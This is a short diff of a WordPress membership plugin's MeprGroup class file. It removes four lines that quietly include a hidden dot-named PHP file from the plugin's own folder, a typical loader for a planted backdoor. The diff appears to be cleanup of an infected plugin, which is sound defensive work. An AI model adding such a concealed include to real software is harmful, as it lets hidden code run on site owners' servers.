@@ -1,10 +1,6 @@
 <?php
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class MeprGroup extends MeprCptModel {
   public static $pricing_page_disabled_str         = '_mepr_group_pricing_page_disabled';
   public static $disable_change_plan_popup_str     = '_mepr_group_disable_change_plan_popup';
